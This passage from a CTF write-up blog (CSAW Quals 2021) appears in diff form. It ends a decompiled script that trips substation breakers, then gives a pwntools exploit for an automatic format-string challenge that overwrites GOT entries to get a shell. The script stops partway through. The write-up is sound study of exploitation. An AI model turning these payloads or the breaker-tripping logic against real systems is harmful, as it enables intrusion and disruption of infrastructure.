+</span><span>    substation_e </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.84&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">12</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">13</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">11</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>)])
+</span><span>    substation_f </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.85&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>)])
+</span><span>    substation_g </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.86&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">14</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">27</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)])
+</span><span>    substation_h </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.87&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">13</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">21</span><span>)])
+</span><span>    substation_i </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.88&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">14</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">13</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">19</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">17</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8</span><span>)])
+</span><span>    substation_a</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_3)
+</span><span>    substation_b</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_c</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_d</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_e</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_3)
+</span><span>    substation_f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_g</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_3)
+</span><span>    substation_h</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span>    substation_i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">activate_all_breakers</span><span>(OPT_4)
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span><span style="font-style:italic;color:#5c6773;">## okay decompiling fate.exe_extracted/trip_breakers.pyc
+</span></code></pre>
+<p>I modified it to connect to localhost so I could packet capture it and then opened it up in wireshark. I applied some filters to only measure tripped breakers (re: OPT_4) and counted the number remaining to get the flag.</p>
+<p>flag{10.95.101.82:200}</p>
+<h1 id="procrastination-simulator"><a href="/csaw-quals-2021/procrastination-simulator">Procrastination Simulator</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Oh noes! I partied all weekend and now it&#39;s an hour before the CTF ends and I have school deadlines tonight too. Can you help me write 60 reports and pwn 50 challenges by Sunday afternoon? nc auto-pwn.chal.csaw.io 11001 with password cd80d3cd8a479a18bbc9652f3631c61c
+</span></code></pre>
+<p>This was an automatic exploit generation challenge; there were four binary classes spread across 50 levels. Each binary was vulnerable to a format string exploit, with more and more mitigations as they got harder.</p>
+<ol>
+<li>32-bit; No PIE; Win function to shell. Overwrite GOT for exit to win function</li>
+<li>64-bit; No PIE; Win function to shell. Overwrite GOT for exit to win function but had to construct the payload a little different bc of null bytes in 64-bit addresses.</li>
+<li>64-bit; No PIE; Win function to shell; Stripped symbols so we had to locate the win function by searching for a string of bytes.</li>
+<li>64-bit; PIE; No win function; We get three payloads. I leaked the program base and libc bases off the stack, overwrote GOT memset with system, and then passed "/bin/sh" for the last time -- calling system("/bin/sh").</li>
+</ol>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">##!/usr/bin/env python3
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>os
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit_1</span><span>(</span><span style="color:#ffcc66;">port</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">shell</span><span>):
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io&quot;</span><span style="color:#ccc9c2cc;">, </span><span>port)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;---</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    binary </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------------------------------------------------------&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary.hex&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(binary)
+</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp binary.hex &gt; binary&quot;</span><span>)
+</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;binary&quot;</span><span>)
+</span><span>    lower </span><span style="color:#f29e74;">= </span><span>(exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">10</span><span>) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff
+</span><span>    upper </span><span style="color:#f29e74;">= </span><span>exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">16
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>([
+</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;BB&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffd580;">p32</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;exit&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffd580;">p32</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;exit&#39;</span><span>]</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span>{lower}</span><span style="color:#bae67e;">c&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>()</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%6$hn&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    ])
+</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(password </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span>payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat message.txt;ls;exit&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag is in another box! &quot;</span><span>)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># print()
+</span><span>    message </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>    </span><span style="color:#f28779;">print</span><span>(message)
+</span><span>    searched </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>message)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>    </span><span style="color:#ffa759;">return </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#ccc9c2cc;">, </span><span>searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit_2</span><span>(</span><span style="color:#ffcc66;">port</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">shell</span><span>):
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io&quot;</span><span style="color:#ccc9c2cc;">, </span><span>port)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;---</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    binary </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------------------------------------------------------&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary.hex&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(binary)
+</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp binary.hex &gt; binary&quot;</span><span>)
+</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;binary&quot;</span><span>)
+</span><span>    lower </span><span style="color:#f29e74;">= </span><span>(exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">10</span><span>) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff
+</span><span>    upper </span><span style="color:#f29e74;">= </span><span>exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">16
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>([
+</span><span>        </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span>{exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>}</span><span style="color:#bae67e;">c&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>()</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;C&quot; </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">- </span><span style="color:#f28779;">len</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>)) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>) </span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%8$hn&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;exit&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>    ])
+</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(password </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span>payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat message.txt;ls;exit&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag is in another box! &quot;</span><span>)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># print()
+</span><span>    message </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>    </span><span style="color:#f28779;">print</span><span>(message)
+</span><span>    searched </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>message)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>    </span><span style="color:#ffa759;">return </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#ccc9c2cc;">, </span><span>searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit_3</span><span>(</span><span style="color:#ffcc66;">port</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">shell</span><span>):
+</span><span>    </span><span style="color:#ffa759;">from </span><span>binascii </span><span style="color:#ffa759;">import </span><span>unhexlify
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io&quot;</span><span style="color:#ccc9c2cc;">, </span><span>port)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># r = process(&quot;./binary&quot;)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;---</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    binary </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------------------------------------------------------&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary.hex&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(binary)
+</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp binary.hex &gt; binary&quot;</span><span>)
+</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;binary&quot;</span><span>)
+</span><span>    win </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffd580;">unhexlify</span><span>(</span><span style="color:#bae67e;">&quot;f30f1efa554889e5488d&quot;</span><span>)))
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>([
+</span><span>        </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span>{win </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>}</span><span style="color:#bae67e;">c&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>()</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;C&quot; </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">- </span><span style="color:#f28779;">len</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(win </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>)) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>) </span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%8$hn&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;exit&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>    ])
+</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(password </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span>payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat message.txt;ls;exit&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag is in another box! &quot;</span><span>)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># print()
+</span><span>    message </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>    </span><span style="color:#f28779;">print</span><span>(message)
+</span><span>    searched </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>message)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>    </span><span style="color:#ffa759;">return </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#ccc9c2cc;">, </span><span>searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit_4</span><span>(</span><span style="color:#ffcc66;">port</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">shell</span><span>):
+</span><span>    </span><span style="color:#ffa759;">from </span><span>binascii </span><span style="color:#ffa759;">import </span><span>unhexlify
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io&quot;</span><span style="color:#ccc9c2cc;">, </span><span>port)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># r = gdb.debug(&quot;./binary&quot;,gdbscript=&quot;b fgets\nc&quot;)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;---</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    binary </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------------------------------------------------------&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary.hex&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(binary)
+</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp binary.hex &gt; binary&quot;</span><span>)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># r.interactive()
+</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;binary&quot;</span><span>)
